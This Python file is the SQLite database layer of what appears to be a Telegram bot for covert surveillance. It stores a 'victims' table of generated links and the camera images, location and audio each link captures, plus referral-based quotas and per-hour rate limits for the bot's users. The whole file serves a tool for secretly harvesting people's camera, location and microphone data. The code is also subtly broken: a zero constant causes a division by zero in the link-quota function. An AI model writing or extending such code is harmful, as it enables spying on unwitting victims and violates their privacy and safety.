import sqlite3, json, os, threading
from datetime import datetime, timedelta

DB_PATH = '/data/database.sqlite'
REQUIRED_REFS = 0
FREE_LINKS = 2
MAX_LINKS_PER_HOUR = 5

class Database:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized: return
        self._initialized = True
        self._local = threading.local()
        self._setup()
    
    def _get_conn(self):
        if not hasattr(self._local, 'conn') or self._local.conn is None:
            os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
            self._local.conn = sqlite3.connect(DB_PATH, timeout=10)
            self._local.conn.row_factory = sqlite3.Row
            self._local.conn.execute("PRAGMA journal_mode=WAL")
            self._local.conn.execute("PRAGMA busy_timeout=5000")
            self._local.conn.execute("PRAGMA synchronous=NORMAL")
        return self._local.conn
    
    @property
    def conn(self): return self._get_conn()
    @property
    def c(self): return self.conn.cursor()
    
    def _setup(self):
        self.c.execute("""CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE NOT NULL,
            username TEXT DEFAULT 'Unknown',
            first_name TEXT DEFAULT '',
            join_date TEXT NOT NULL,
            referred_by INTEGER DEFAULT NULL,
            refer_count INTEGER DEFAULT 0,
            total_links_created INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            last_link_time TEXT DEFAULT NULL
        )""")
        self.c.execute("""CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_code TEXT UNIQUE NOT NULL,
            telegram_id INTEGER NOT NULL,
            created_at TEXT NOT NULL,
            camera_url TEXT, location_url TEXT, audio_url TEXT,
            camera_data TEXT DEFAULT NULL,
            location_data TEXT DEFAULT NULL,
            audio_data TEXT DEFAULT NULL,
            access_count INTEGER DEFAULT 0,
            last_access TEXT DEFAULT NULL
        )""")
        self.c.execute("""CREATE TABLE IF NOT EXISTS referral_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER NOT NULL,
            referred_id INTEGER NOT NULL,
            timestamp TEXT NOT NULL,
            UNIQUE(referrer_id, referred_id)
        )""")
        self.conn.commit()
    
    def get_user(self, tid):
        self.c.execute("SELECT * FROM users WHERE telegram_id=?", (tid,))
        row = self.c.fetchone()
        if row:
            return dict(row)
        return None
    
    def create_user(self, tid, un, fn=""):
        try:
            self.c.execute("INSERT OR IGNORE INTO users (telegram_id,username,first_name,join_date) VALUES (?,?,?,?)",
                          (tid, un, fn, datetime.now().isoformat()))
            self.conn.commit()
            return True
        except: return False
    
    def get_available_links(self, tid):
        u = self.get_user(tid)
        if not u: return 0
        if u.get('is_banned'): return 0
        # FREE_LINKS = 2, referral bonus = refer_count // REQUIRED_REFS
        bonus = u.get('refer_count', 0) // REQUIRED_REFS
        total = FREE_LINKS + bonus
        self.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=?", (tid,))
        used = self.c.fetchone()[0]
        available = total - used
        print(f"User {tid}: FREE={FREE_LINKS}, bonus={bonus}, total={total}, used={used}, available={available}", flush=True)
        return max(0, available)
    
    def create_victim(self, tid, code, cu, lu, au):
        try:
            self.c.execute("BEGIN IMMEDIATE")
            self.c.execute("INSERT INTO victims VALUES (NULL,?,?,?,?,?,?,NULL,NULL,NULL,0,NULL)",
                          (code, tid, datetime.now().isoformat(), cu, lu, au))
            self.c.execute("UPDATE users SET total_links_created=total_links_created+1,last_link_time=? WHERE telegram_id=?",
                          (datetime.now().isoformat(), tid))
            self.conn.commit()
            return True
        except:
            self.conn.rollback()
            return False
    
    def add_referral(self, referrer_id, referred_id):
        if referrer_id == referred_id:
            print("Self referral rejected", flush=True)
            return False
        try:
            self.c.execute("BEGIN IMMEDIATE")
            # Check if already exists
            self.c.execute("SELECT id FROM referral_log WHERE referrer_id=? AND referred_id=?", (referrer_id, referred_id))
            if self.c.fetchone():
                print(f"Referral already exists: {referrer_id} -> {referred_id}", flush=True)
                self.conn.rollback()
                return False
            # Insert referral log
            self.c.execute("INSERT INTO referral_log (referrer_id, referred_id, timestamp) VALUES (?,?,?)",
                          (referrer_id, referred_id, datetime.now().isoformat()))
            # Update refer_count
            self.c.execute("UPDATE users SET refer_count = refer_count + 1 WHERE telegram_id=?", (referrer_id,))
            # Set referred_by for the new user
            self.c.execute("UPDATE users SET referred_by=? WHERE telegram_id=? AND referred_by IS NULL", (referrer_id, referred_id))
            self.conn.commit()
            print(f"Referral added: {referrer_id} -> {referred_id}", flush=True)
            return True
        except Exception as e:
            print(f"add_referral error: {e}", flush=True)
            self.conn.rollback()
            return False
    
    def update_victim_data(self, code, dtype, data):
        col = 'camera_data'
        if dtype in ('location','location_data'): col = 'location_data'
        if dtype in ('audio','audio_data'): col = 'audio_data'
        try:
            j = json.dumps(data) if isinstance(data,(dict,list)) else str(data)
            self.c.execute(f"UPDATE victims SET {col}=?,access_count=access_count+1,last_access=? WHERE victim_code=?", (j, datetime.now().isoformat(), code))
            self.conn.commit()
            return True
        except: return False
    
    def get_victim_owner(self, code):
        self.c.execute("SELECT telegram_id FROM victims WHERE victim_code=?", (code,))
        row = self.c.fetchone()
        return row['telegram_id'] if row else None
    
    def get_victim(self, code):
        self.c.execute("SELECT * FROM victims WHERE victim_code=?", (code,))
        row = self.c.fetchone()
        if row: return dict(row)
        return None
    
    def get_user_victims(self, tid, limit=50, offset=0):
        self.c.execute("SELECT * FROM victims WHERE telegram_id=? ORDER BY created_at DESC LIMIT ? OFFSET ?", (tid, limit, offset))
        rows = self.c.fetchall()
        return [dict(r) for r in rows]
    
    def is_rate_limited(self, tid):
        h = (datetime.now() - timedelta(hours=1)).isoformat()
        self.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=? AND created_at>?", (tid, h))
        row = self.c.fetchone()
        count = row[0] if row else 0
        return count >= MAX_LINKS_PER_HOUR
    
    def get_stats(self):
        s = {}
        self.c.execute("SELECT COUNT(*) FROM users"); s['users'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims"); s['victims'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims WHERE camera_data IS NOT NULL"); s['camera'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims WHERE location_data IS NOT NULL"); s['location'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims WHERE audio_data IS NOT NULL"); s['audio'] = self.c.fetchone()[0]
        return s

db = Database()
